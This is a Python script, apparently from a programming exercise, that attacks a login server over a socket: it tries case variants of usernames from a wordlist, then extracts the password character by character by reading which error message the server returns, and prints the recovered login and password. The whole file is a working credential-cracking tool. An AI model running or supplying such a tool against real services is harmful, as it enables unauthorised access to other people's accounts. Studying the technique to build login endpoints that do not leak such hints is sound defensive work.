import socket
import argparse
import itertools
import json


def return_login_in_list():
    file_password = open('/home/user/Downloads/logins.txt')
    for login_word in file_password.read().split():
        login_list = []
        for login_alpha in login_word:
            if login_alpha.isdigit():
                login_list.append(login_alpha)
            else:
                login_list.append(login_alpha)
                login_list.append(login_alpha.upper())
        yield login_list, login_word


def generate_login():
    word = return_login_in_list()
    while True:
        login_list = []
        login = next(word)
        for log in itertools.combinations(login[0], len(login[1])):
            if ''.join(log).lower() == login[1]:
                if log in login_list:
                    pass
                else:
                    login_list.append(log)
                    yield ''.join(log)


def return_alpha():
    password_alpha = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                      'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
                      'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N',
                      'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
                      '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    for alpha in password_alpha:
        yield alpha


def send_login():
    login_generator = generate_login()
    login = next(login_generator)
    password_to_send = ''
    while True:
        data_to_send = {"login": login, "password": password_to_send}
        client_socket.send(json.dumps(data_to_send).encode())
        response = json.loads(client_socket.recv(1024).decode())
        result = response['result']
        if result == 'Wrong login!':
            login = next(login_generator)
        else:
            return login


def send_login_and_password():
    letter_generator = return_alpha()
    login = send_login()
    found_password = ''
    while True:
        password_alpha = next(letter_generator)
        password_to_send = found_password + password_alpha
        data_to_send = {"login": login, "password": password_to_send}
        client_socket.send(json.dumps(data_to_send).encode())
        response = json.loads(client_socket.recv(1024).decode())
        result = response['result']
        if result == 'Exception happened during login':
            found_password += password_alpha
            letter_generator = return_alpha()
        elif result == 'Connection success!':
            found_password += password_alpha
            print(json.dumps({"login": login, "password": found_password}))
            break
#

parser = argparse.ArgumentParser()
parser.add_argument('IP_address')
parser.add_argument('port')
args = parser.parse_args()
hostname = args.IP_address
port = int(args.port)
client_socket = socket.socket()
address = (hostname, port)
client_socket.connect(address)
send_login_and_password()
client_socket.close()
